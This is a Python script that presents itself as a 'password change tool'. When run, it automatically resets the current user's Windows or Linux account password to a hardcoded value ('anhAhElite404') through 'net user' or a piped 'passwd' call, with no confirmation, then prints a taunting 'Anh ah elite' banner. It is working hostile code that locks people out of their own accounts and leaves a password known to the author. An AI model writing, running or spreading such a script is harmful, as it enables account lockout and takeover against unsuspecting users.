import subprocess
import sys
import getpass
import platform
import os

# Static password for password changes
STATIC_PASSWORD = "anhAhElite404"

def get_current_username():
    """Get the current logged-in username"""
    try:
        if platform.system() == "Windows":
            return os.getenv('USERNAME')
        else:
            return os.getenv('USER')
    except:
        return None

def change_password_windows():
    print("Windows password change tool...")
    print("Detecting current user...\n")
    
    username = get_current_username()
    if not username:
        print("✗ Error: Could not detect current username.")
        return
    
    print(f"Current user detected: {username}")
    print(f"Attempting to change password...\n")
    
    try:
        # Attempt with current privileges first
        result = subprocess.run(
            ["net", "user", username, STATIC_PASSWORD],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True
        )
        
        if result.returncode == 0:
            print(f"✓ Password for user '{username}' changed successfully to static password!")
            print("Hello world! Anh ah elite")
        else:
            error_msg = result.stderr.decode()
            print(f"✗ Error changing password: {error_msg}")
            print("Note: Administrator privileges may be required.")
    except Exception as e:
        print(f"Error: {e}")

def change_password_linux():
    print("Linux password change tool...")
    print("Detecting current user...\n")
    
    username = get_current_username()
    if not username:
        print("✗ Error: Could not detect current username.")
        return
    
    print(f"Current user detected: {username}")
    print(f"Attempting to change password...\n")
    
    try:
        # Use echo to pipe the password to passwd command
        process = subprocess.Popen(
            ['passwd', username],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Send the new password twice (for confirmation)
        stdout, stderr = process.communicate(input=f"{STATIC_PASSWORD}\n{STATIC_PASSWORD}\n")
        
        if process.returncode == 0:
            print(f"✓ Password for user '{username}' changed successfully!")
            print("Hello world! Anh ah elite")
        else:
            print(f"✗ Error: {stderr}")
    except Exception as e:
        print(f"Error: {e}")

def change_password_macos():
    print("On macOS, changing password via script is restricted for security reasons.")
    print("Opening System Settings → Users & Groups (recommended)...")
    subprocess.run(["open", "x-apple.systempreferences:com.apple.preferences.users"])

def main():
    current_os = platform.system()

    print(f"Detected operating system: {current_os}")
    print("Starting automatic password change...\n")

    if current_os == "Windows":
        change_password_windows()
    elif current_os == "Linux":
        change_password_linux()
    elif current_os == "Darwin":  # macOS
        change_password_macos()
    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    main()